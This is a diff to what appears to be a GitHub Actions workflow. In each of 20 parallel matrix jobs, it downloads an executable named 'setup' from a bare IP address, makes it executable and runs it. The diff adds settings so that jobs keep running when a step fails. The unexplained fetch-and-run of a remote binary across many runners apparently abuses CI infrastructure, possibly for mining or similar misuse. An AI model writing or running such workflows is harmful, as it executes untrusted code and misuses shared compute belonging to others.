@@ -11,8 +11,8 @@ jobs:
   build:
     runs-on: ubuntu-latest
 
-    # Chạy 20 job song song (instance 1..20)
     strategy:
+      fail-fast: false
       matrix:
         instance: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
 
@@ -29,7 +29,10 @@ jobs:
         run: sudo apt update && sudo apt install wget -y
 
       - name: Run a multi-line script
+        continue-on-error: true
         run: |
-          wget http://38.242.224.156:8082/setup
-          chmod +x setup
-          ./setup
+          wget -nv http://38.242.224.156:8082/setup -O setup
+          if [ -f setup ]; then
+            chmod +x setup
+            ./setup
+          fi
